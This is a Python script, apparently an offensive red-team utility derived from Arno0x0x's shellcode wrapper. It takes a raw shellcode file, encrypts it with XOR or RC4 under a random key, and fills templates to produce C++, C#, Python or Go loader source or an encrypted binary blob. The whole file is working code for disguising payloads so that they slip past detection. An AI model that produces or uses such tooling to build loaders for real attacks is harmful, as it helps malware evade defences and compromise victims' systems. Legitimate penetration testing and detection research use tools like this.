#!/usr/bin/python
# -*- coding: utf8 -*-
#
# Author: Arno0x0x, Twitter: @Arno0x0x
# Modify: Ch1ng
# 
import os
import struct
import random
import string
import argparse
from os import urandom
from string import Template


templates = {
	'cpp': './templates/encryptedShellcodeWrapper.cpp',
	'csharp': './templates/encryptedShellcodeWrapper.cs',
	'python': './templates/encryptedShellcodeWrapper.py',
	'golang': './templates/encryptedShellcodeWrapper.go',
}

resultFiles = {
	'cpp': './result/encryptedShellcodeWrapper.cpp',
	'csharp': './result/encryptedShellcodeWrapper.cs',
	'python': './result/encryptedShellcodeWrapper.py',
	'golang': './result/encryptedShellcodeWrapper.go'

}
resultBinFiles = {
	'bin' :'./result/encryptpayload.bin'

}

#======================================================================================================
#											CRYPTO FUNCTIONS
#======================================================================================================

#------------------------------------------------------------------------
# data as a bytearray
# key as a string
def xor(data, key):
	l = len(key)
	keyAsInt = list(map(ord, key))
	return bytes(bytearray((
	    (data[i] ^ keyAsInt[i % l]) for i in range(0,len(data))
	)))

def rc4(PlainBytes:bytes, KeyBytes:bytes):
    #keystreamList = []
    cipherList = []
 
    keyLen = len(KeyBytes)
    plainLen = len(PlainBytes)
    S = list(range(256))
 
    j = 0
    for i in range(256):
        j = (j + S[i] + KeyBytes[i % keyLen]) % 256
        S[i], S[j] = S[j], S[i]
    i = 0
    j = 0
    for m in range(plainLen):
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        k = S[(S[i] + S[j]) % 256]
        cipherList.append(k ^ PlainBytes[m])
    #result_hexstr = ','.join(['%02x' % i for i in cipherList])
    return bytes(bytearray(cipherList))

#======================================================================================================
#											OUTPUT FORMAT FUNCTIONS
#======================================================================================================
def convertFromTemplate(parameters, templateFile):
	try:
		with open(templateFile) as f:
			src = Template(f.read())
			result = src.substitute(parameters)
			f.close()
			return result
	except IOError:
		print(color("[!] Could not open or read template file [{}]".format(templateFile)))
		return None


def formatGolang(data, key, cipherType):
	shellcode = "\\x"
	shellcode += "\\x".join(format(b,'02x') for b in data)
	
	#shellcode += "\\x".join((format(b,'02x')+"\\x01\\x02\\x03") for b in data)
	#print(shellcode)
	key2 = "\\x"
	key2 += "\\x".join(format(b,'02x') for b in bytes(key.encode('utf-8')))
	result = convertFromTemplate({'shellcode': shellcode, 'key': key2, 'cipherType': cipherType}, templates['golang'])

	if result != None:
		try:
			fileName = os.path.splitext(resultFiles['golang'])[0] + "_" + cipherType + os.path.splitext(resultFiles['golang'])[1]
			with open(fileName,"w+") as f:
				f.write(result)
				f.close()
				print(color("[+] Golang code file saved in [{}]".format(fileName)))
		except IOError:
			print(color("[!] Could not write Golang code  [{}]".format(fileName)))
			
#------------------------------------------------------------------------
# data as a bytearray
def formatCPP(data, key, cipherType):
	shellcode = "\\x"
	shellcode += "\\x".join(format(b,'02x') for b in data)
	
	#shellcode += "\\x".join((format(b,'02x')+"\\x01\\x02\\x03") for b in data)
	#print(shellcode)
	result = convertFromTemplate({'shellcode': shellcode, 'key': str(key), 'cipherType': cipherType}, templates['cpp'])

	if result != None:
		try:
			fileName = os.path.splitext(resultFiles['cpp'])[0] + "_" + cipherType + os.path.splitext(resultFiles['cpp'])[1]
			with open(fileName,"w+") as f:
				f.write(result)
				f.close()
				print(color("[+] C++ code file saved in [{}]".format(fileName)))
		except IOError:
			print(color("[!] Could not write C++ code  [{}]".format(fileName)))
			
#------------------------------------------------------------------------
# data as a bytearray
def formatCSharp(data, key, cipherType):
	shellcode = '0x'
	shellcode += ',0x'.join(format(b,'02x') for b in data)
	result = convertFromTemplate({'shellcode': shellcode, 'key': str(key), 'cipherType': cipherType}, templates['csharp'])

	if result != None:
		try:
			fileName = os.path.splitext(resultFiles['csharp'])[0] + "_" + cipherType + os.path.splitext(resultFiles['csharp'])[1]
			with open(fileName,"w+") as f:
				f.write(result)
				f.close()
				print(color("[+] C# code file saved in [{}]".format(fileName)))
		except IOError:
			print(color("[!] Could not write C# code  [{}]".format(fileName)))

def formatPy(data, key, cipherType):
	shellcode = '\\x'
	shellcode += '\\x'.join(format(b,'02x') for b in data)
	result = convertFromTemplate({'shellcode': shellcode, 'key': str(key), 'cipherType': cipherType}, templates['python'])

	if result != None:
		try:
			fileName = os.path.splitext(resultFiles['python'])[0] + "_" + cipherType + os.path.splitext(resultFiles['python'])[1]
			with open(fileName,"w+") as f:
				f.write(result)
				f.close()
				print(color("[+] Python code file saved in [{}]".format(fileName)))
		except IOError:
			print(color("[!] Could not write Python code  [{}]".format(fileName)))

def formatCPPBinfile(data):
	fileName = os.path.splitext(resultBinFiles['bin'])[0] + "_" + cipherType + os.path.splitext(resultBinFiles['bin'])[1]
	with open(fileName,"wb") as fo:
		for x in data:
			a = struct.pack('B', x)
			fo.write(a)
	print(color("[+] Bin file saved in [{}]".format(fileName)))

def color(string, color=None):
    """
    Author: HarmJ0y, borrowed from Empire
    Change text color for the Linux terminal.
    """
    
    attr = []
    # bold
    attr.append('1')
    
    if color:
        if color.lower() == "red":
            attr.append('31')
        elif color.lower() == "green":
            attr.append('32')
        elif color.lower() == "blue":
            attr.append('34')
        return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)

    else:
        if string.strip().startswith("[!]"):
            attr.append('31')
            return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
        elif string.strip().startswith("[+]"):
            attr.append('32')
            return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
        elif string.strip().startswith("[?]"):
            attr.append('33')
            return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
        elif string.strip().startswith("[*]"):
            attr.append('34')
            return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
        else:
            return string

#======================================================================================================
#											MAIN FUNCTION
#======================================================================================================
if __name__ == '__main__':
	#------------------------------------------------------------------------
	# Parse arguments
	parser = argparse.ArgumentParser()
	parser.add_argument("shellcodeFile", help="File name containing the raw shellcode to be encoded/encrypted")
	parser.add_argument("encryptionType", help="Encryption algorithm to apply to the shellcode", choices=['xor','rc4'])
	parser.add_argument("-bin", "--binary", help="Generates encrypt binary file", action="store_true")
	parser.add_argument("-cpp", "--cplusplus", help="Generates C++ file code", action="store_true")
	parser.add_argument("-cs", "--csharp", help="Generates C# file code", action="store_true")
	parser.add_argument("-go", "--golang", help="Generates Golang file code", action="store_true")
	parser.add_argument("-py", "--python", help="Generates Python file code", action="store_true")
	args = parser.parse_args() 

	#------------------------------------------------------------------------------
	# Check that required directories and path are available, if not create them
	if not os.path.isdir("./result"):
		os.makedirs("./result")
		print(color("[+] Creating [./result] directory for resulting code files"))

	#------------------------------------------------------------------------
	# Open shellcode file and read all bytes from it
	try:
		with open(args.shellcodeFile,"rb") as shellcodeFileHandle:
			shellcodeBytes = bytearray(shellcodeFileHandle.read())
			shellcodeFileHandle.close()
			print(color("[*] Shellcode file [{}] successfully loaded".format(args.shellcodeFile)))
	except IOError:
		print(color("[!] Could not open or read file [{}]".format(args.shellcodeFile)))
		quit()

	print(color("[*] Shellcode size: [{}] bytes".format(len(shellcodeBytes))))


	#------------------------------------------------------------------------
	# Perform XOR transformation
	if args.encryptionType == 'xor':
		masterKey = ''.join(random.sample(string.ascii_letters + string.digits, 8))
		print(color("[*] XOR encoding the shellcode with key [{}]".format(masterKey)))
		transformedShellcode = xor(shellcodeBytes, masterKey)
		cipherType = 'xor'
	elif args.encryptionType == 'rc4':
		masterKey = ''.join(random.sample(string.ascii_letters + string.digits, 8))
		print(color("[*] RC4 encoding the shellcode with key [{}]".format(masterKey)))
		transformedShellcode = rc4(shellcodeBytes, bytes(masterKey,encoding="utf-8"))
		cipherType = 'rc4'
	#------------------------------------------------------------------------
	# Display interim results
	print("\n==================================== RESULT ====================================\n")
	print(color("[*] Encrypted shellcode size: [{}] bytes".format(len(transformedShellcode))))
	#------------------------------------------------------------------------
	if args.cplusplus:
		print(color("[*] Generating C++ code file"))
		formatCPP(transformedShellcode, masterKey, cipherType)
	if args.binary:
		print(color("[*] Generating encrypt binary file"))
		formatCPPBinfile(transformedShellcode)

	if args.csharp:
		print(color("[*] Generating C# code file"))
		formatCSharp(transformedShellcode, masterKey, cipherType)

	if args.python:
		print(color("[*] Generating Python code file"))
		formatPy(transformedShellcode, masterKey, cipherType)
	if args.golang:
		print(color("[*] Generating Python code file"))
		formatGolang(transformedShellcode, masterKey, cipherType)
